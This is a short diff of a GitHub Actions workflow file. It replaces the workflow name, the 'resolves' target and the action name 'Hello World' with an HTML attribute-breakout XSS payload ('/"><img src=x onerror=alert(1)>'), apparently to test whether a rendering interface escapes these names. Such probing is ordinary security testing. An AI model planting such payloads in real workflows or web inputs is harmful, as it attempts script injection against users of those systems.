@@ -1,8 +1,8 @@
-workflow "New workflow" {
+workflow "/"><img src=x onerror=alert(1)>" {
   on = "push"
-  resolves = ["Hello World"]
+  resolves = ["/"><img src=x onerror=alert(1)>"]
 }
 
-action "Hello World" {
+action "/"><img src=x onerror=alert(1)>" {
   uses = "./action-a"
 }
